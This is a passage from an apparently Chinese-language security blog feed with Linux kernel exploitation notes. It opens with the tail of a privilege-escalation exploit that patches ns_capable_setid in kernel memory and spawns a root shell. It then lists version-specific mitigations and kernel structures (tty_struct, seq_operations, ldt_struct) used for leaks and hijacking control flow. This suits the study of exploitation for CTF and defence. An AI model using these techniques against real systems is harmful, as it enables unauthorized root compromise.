vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ns_capable_setid</code>函数用于在setreid时判断是否具有权限</p><p>我们劫持其为始终返回<code>1</code>,即拥有任意设置id的权限</p>]]></content>
    
    
    <summary type="html">orz</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>kernel小记</title>
    <link href="https://ixout.github.io/posts/57127/"/>
    <id>https://ixout.github.io/posts/57127/</id>
    <published>2024-03-22T02:22:04.000Z</published>
    <updated>2024-11-20T14:11:46.256Z</updated>
    
    <content type="html"><![CDATA[<h1 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h1><h2 id="过时"><a href="#过时" class="headerlink" title="过时"></a>过时</h2><h3 id="prepare-kernel-cred-NULL"><a href="#prepare-kernel-cred-NULL" class="headerlink" title="prepare_kernel_cred(NULL)"></a>prepare_kernel_cred(NULL)</h3><p><strong>过时版本:6.2</strong></p><p>自从<strong><u>内核版本 6.2</u></strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法<strong>无法再应用于 6.2 及更高版本的内核：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="UAF-cred-jar"><a href="#UAF-cred-jar" class="headerlink" title="UAF cred_jar"></a>UAF cred_jar</h3><p><strong>过时版本:4.5</strong></p><p>从4.5版本开始,我们已无法直接分配到 cred_jar 中的 object<strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时(默认开启)</strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h3><p><strong>过时版本:5.13</strong></p><p><strong>在5.13,内核入栈时添加了一个偏移值,这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure><h3 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h3><p><strong>过时版本:5.11</strong></p><p>在大概<code>5.11</code>版本前后,由于变量<code>sysctl_unprivileged_userfaultfd</code>不再被初识赋值为1,使得userfaultfd不再能被非root用户使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//before</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//now:</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br></pre></td></tr></table></figure><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h3><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110</p><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h2><p><strong>申请obj大小:1k</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|直接映射区泄露|劫持流</strong></p><hr><p>打开一个 tty 设备文件时,内核最终会调用 <code>alloc_tty_struct()</code> 来分配一个 <code>tty_struct</code> 结构体</p><p>一般情况下,我们选择打开<code>/dev/ptmx</code>文件来<strong>分配</strong>一个<code>tty_struct</code>结构体</p><p>关闭该文件即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/dev/ptmx&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;<span class="comment">//掩码0x5401</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><p><code>tty_struct</code>中ops对应的<code>tty_operations</code>结构体,定义于<code>/include/linux/tty_driver.h</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:是</strong></p><p><strong>功能:.text泄露|劫持流</strong></p><p>当打开<code>/proc/id/stat</code>文件时,会分配一个<code>seq_operations</code>结构体,定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只包含四个函数指针,显然可以用来劫持执行流和泄露地址</p><p>一般选择打开<code>/proc/self/stat</code>来<strong>分配</strong>该结构体,同样关闭即可<strong>释放</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><p><strong>申请obj大小:32[slab]||16[slub]</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:任意读|任意写</strong></p><p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span 